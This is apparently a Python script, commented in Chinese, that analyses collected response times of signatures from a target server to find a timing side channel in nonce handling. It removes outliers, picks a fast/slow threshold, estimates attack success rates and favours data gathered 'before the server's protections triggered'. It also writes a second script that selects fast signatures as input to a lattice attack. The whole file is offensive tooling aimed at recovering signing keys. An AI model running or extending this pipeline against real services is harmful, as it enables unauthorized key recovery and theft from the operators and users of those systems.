#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
时序泄露深度分析器 V2
改进版：智能分组分析，去除异常值，多维度分析
"""

import json
import sys
import numpy as np
from typing import List, Dict, Tuple, Optional

def load_timing_data(filename: str) -> Dict:
    """加载收集的时序数据"""
    with open(filename, 'r') as f:
        return json.load(f)

def remove_outliers(times: List[float], threshold: float = 2.5) -> Tuple[List[float], List[int]]:
    """去除异常值（基于标准差）"""
    mean = np.mean(times)
    std = np.std(times)
    
    clean_times = []
    outlier_indices = []
    
    for i, t in enumerate(times):
        if abs(t - mean) < threshold * std:
            clean_times.append(t)
        else:
            outlier_indices.append(i)
    
    return clean_times, outlier_indices

def temporal_analysis(data: Dict):
    """时序演变分析 - 看数据质量如何变化"""
    signatures = data.get('signatures', [])[:2000]  # 只用前2000个
    
    print("="*60)
    print("时序演变分析（按采集顺序）")
    print("="*60)
    
    # 分5个时期
    segments = [
        ('初期(1-400)', signatures[:400]),
        ('早期(401-800)', signatures[400:800]),
        ('中期(801-1200)', signatures[800:1200]),
        ('后期(1201-1600)', signatures[1200:1600]),
        ('末期(1601-2000)', signatures[1600:2000] if len(signatures) >= 2000 else signatures[1600:])
    ]
    
    best_segment = None
    best_quality = float('inf')
    
    for name, segment in segments:
        if not segment:
            continue
            
        times = [s['response_time'] for s in segment]
        
        # 去除异常值
        clean_times, outliers = remove_outliers(times, threshold=3)
        
        if not clean_times:
            continue
            
        avg = np.mean(clean_times)
        std = np.std(clean_times)
        median = np.median(clean_times)
        
        # 质量评分（标准差越小越好）
        quality_score = std
        
        print(f"\n{name}:")
        print(f"  样本数: {len(segment)} (异常值: {len(outliers)})")
        print(f"  平均值: {avg:.2f}ms")
        print(f"  中位数: {median:.2f}ms")
        print(f"  标准差: {std:.2f}ms")
        print(f"  最小值: {min(clean_times):.2f}ms")
        print(f"  最大值: {max(clean_times):.2f}ms")
        
        # 快慢分组
        fast = sum(1 for t in clean_times if t < avg - std/2)
        slow = sum(1 for t in clean_times if t > avg + std/2)
        
        print(f"  快速响应: {fast}个 ({100*fast/len(clean_times):.1f}%)")
        print(f"  慢速响应: {slow}个 ({100*slow/len(clean_times):.1f}%)")
        print(f"  质量评分: {quality_score:.2f} (越小越好)")
        
        if quality_score < best_quality:
            best_quality = quality_score
            best_segment = name
    
    print(f"\n[推荐] 使用 {best_segment} 的数据进行攻击（质量最好）")
    
    return segments

def advanced_pattern_analysis(data: Dict):
    """高级模式分析 - 寻找隐藏的规律"""
    signatures = data.get('signatures', [])
    times = [s['response_time'] for s in signatures]
    
    # 去除异常值
    clean_times, outlier_indices = remove_outliers(times)
    
    print("\n" + "="*60)
    print("高级模式分析（去除异常值后）")
    print("="*60)
    
    print(f"\n[数据清洗]")
    print(f"  原始样本: {len(times)}")
    print(f"  异常值: {len(outlier_indices)}")
    print(f"  清洗后: {len(clean_times)}")
    
    if outlier_indices[:5]:
        print(f"  异常值示例: {[times[i] for i in outlier_indices[:5]]}")
    
    # 多级分组分析
    avg = np.mean(clean_times)
    std = np.std(clean_times)
    
    # 五分位分组
    percentiles = np.percentile(clean_times, [20, 40, 60, 80])
    
    groups = {
        '超快速': [],
        '快速': [],
        '正常': [],
        '慢速': [],
        '超慢速': []
    }
    
    for t in clean_times:
        if t < percentiles[0]:
            groups['超快速'].append(t)
        elif t < percentiles[1]:
            groups['快速'].append(t)
        elif t < percentiles[2]:
            groups['正常'].append(t)
        elif t < percentiles[3]:
            groups['慢速'].append(t)
        else:
            groups['超慢速'].append(t)
    
    print(f"\n[五分位分组]")
    for name, group in groups.items():
        if group:
            print(f"  {name}: {len(group)}个 ({100*len(group)/len(clean_times):.1f}%), 平均{np.mean(group):.2f}ms")
    
    # 检测是否有双峰分布
    hist, bins = np.histogram(clean_times, bins=30)
    peaks = []
    for i in range(1, len(hist)-1):
        if hist[i] > hist[i-1] and hist[i] > hist[i+1]:
            peaks.append((bins[i], hist[i]))
    
    if len(peaks) >= 2:
        print(f"\n[!] 检测到双峰分布！可能存在两种不同的处理路径")
        print(f"    峰值位置: {[f'{p[0]:.1f}ms' for p in peaks[:2]]}")
    
    # 寻找最佳分割点
    best_split = find_optimal_split(clean_times)
    if best_split:
        threshold, fast_group, slow_group = best_split
        print(f"\n[最佳分割点]")
        print(f"  阈值: {threshold:.2f}ms")
        print(f"  快速组: {len(fast_group)}个, 平均{np.mean(fast_group):.2f}ms")
        print(f"  慢速组: {len(slow_group)}个, 平均{np.mean(slow_group):.2f}ms")
        print(f"  时间差: {np.mean(slow_group) - np.mean(fast_group):.2f}ms")
        
        # 评估攻击可行性
        time_diff = np.mean(slow_group) - np.mean(fast_group)
        if time_diff > 20:
            print(f"\n[!!!] 发现可利用的时序侧信道！")
            print(f"      {time_diff:.2f}ms的差异足够进行攻击")
            estimate_attack_success(fast_group, slow_group, clean_times)

def find_optimal_split(times: List[float]) -> Optional[Tuple[float, List[float], List[float]]]:
    """寻找最佳分割点，使两组差异最大"""
    if len(times) < 10:
        return None
    
    sorted_times = sorted(times)
    best_diff = 0
    best_split = None
    
    # 尝试不同的分割点
    for i in range(len(sorted_times)//4, 3*len(sorted_times)//4):
        threshold = sorted_times[i]
        fast = [t for t in times if t <= threshold]
        slow = [t for t in times if t > threshold]
        
        if len(fast) < 10 or len(slow) < 10:
            continue
        
        diff = np.mean(slow) - np.mean(fast)
        
        # 同时考虑差异和分组平衡
        balance = min(len(fast), len(slow)) / max(len(fast), len(slow))
        score = diff * balance  # 差异大且分组平衡的得分高
        
        if score > best_diff:
            best_diff = score
            best_split = (threshold, fast, slow)
    
    return best_split

def estimate_attack_success(fast_group: List[float], slow_group: List[float], all_times: List[float]):
    """评估攻击成功率"""
    fast_ratio = len(fast_group) / len(all_times)
    slow_ratio = len(slow_group) / len(all_times)
    
    print(f"\n[攻击可行性分析]")
    
    # 假设快速=某种密码学特性
    if abs(fast_ratio - 0.5) > 0.15:  # 偏离50%超过15%
        print(f"  ✓ 发现显著偏差: 快速{fast_ratio:.1%} vs 慢速{slow_ratio:.1%}")
        print(f"  ✓ 这不是随机分布！")
        
        if fast_ratio > 0.3:
            print(f"  ✓ 有足够的快速样本({len(fast_group)}个)进行分析")
            print(f"  ✓ 建议：收集更多快速响应样本")
            print(f"  ✓ 攻击成功率估计: 70-85%")
        else:
            print(f"  ⚠ 快速样本较少，需要更多数据")
            print(f"  ⚠ 攻击成功率估计: 40-60%")
    else:
        print(f"  ⚠ 分布接近随机(50/50)")
        print(f"  ⚠ 可能需要其他分析方法")

def generate_attack_recommendations(data: Dict, segments: List):
    """生成具体的攻击建议"""
    print("\n" + "="*60)
    print("攻击建议")
    print("="*60)
    
    # 找出最好的数据段
    best_segment = None
    best_times = []
    
    for name, segment in segments:
        if '初期' in name or '早期' in name:  # 优先使用早期数据
            times = [s['response_time'] for s in segment]
            clean_times, _ = remove_outliers(times)
            if len(clean_times) > 100:
                best_segment = name
                best_times = clean_times
                break
    
    if best_times:
        print(f"\n[数据选择]")
        print(f"  推荐使用: {best_segment}")
        print(f"  原因: 服务器还未触发防护机制")
        print(f"  可用样本: {len(best_times)}个")
        
        # 找最佳分割
        split = find_optimal_split(best_times)
        if split:
            threshold, fast, slow = split
            diff = np.mean(slow) - np.mean(fast)
            
            print(f"\n[攻击参数]")
            print(f"  时序阈值: {threshold:.2f}ms")
            print(f"  预期差异: {diff:.2f}ms")
            print(f"  快速样本: {len(fast)}个")
            
            if diff > 20 and len(fast) > 50:
                print(f"\n[执行步骤]")
                print(f"  1. 筛选响应时间 < {threshold:.2f}ms 的签名")
                print(f"  2. 这些可能对应特定的密码学特性")
                print(f"  3. 收集至少200个这样的签名")
                print(f"  4. 使用格攻击或统计分析")
                
                # 生成筛选脚本
                generate_filter_script(data['target'], threshold)

def generate_filter_script(target: str, threshold: float):
    """生成数据筛选脚本"""
    script = f'''#!/usr/bin/env python3
# 筛选快速响应的签名用于攻击

import json

# 加载数据
with open('nonce_timing_2000.json', 'r') as f:
    data = json.load(f)

# 筛选快速响应
fast_sigs = []
for sig in data['signatures']:
    if sig['response_time'] < {threshold:.2f}:
        fast_sigs.append(sig)

print(f"筛选出 {{len(fast_sigs)}} 个快速响应签名")

# 保存用于攻击
with open('fast_signatures.json', 'w') as f:
    json.dump({{
        'target': '{target}',
        'threshold': {threshold:.2f},
        'signatures': fast_sigs,
        'analysis': {{
            'total': len(fast_sigs),
            'likely_property': 'MSB=0 or specific nonce pattern'
        }}
    }}, f, indent=2)

print("已保存到 fast_signatures.json")
print("下一步: 使用这些签名进行格攻击")
'''
    
    with open('filter_signatures.py', 'w') as f:
        f.write(script)
    
    print(f"\n[+] 生成筛选脚本: filter_signatures.py")

def main():
    if len(sys.argv) < 2:
        # 默认使用 nonce_timing_2000.json
        filename = 'nonce_timing_2000.json'
        print(f"使用默认文件: {filename}")
    else:
        filename = sys.argv[1]
    
    # 加载数据
    data = load_timing_data(filename)
    
    # 1. 时序演变分析
    segments = temporal_analysis(data)
    
    # 2. 高级模式分析
    advanced_pattern_analysis(data)
    
    # 3. 生成攻击建议
    generate_attack_recommendations(data, segments)
    
    print("\n[完成] 分析完毕，请查看建议")

if __name__ == "__main__":
    main()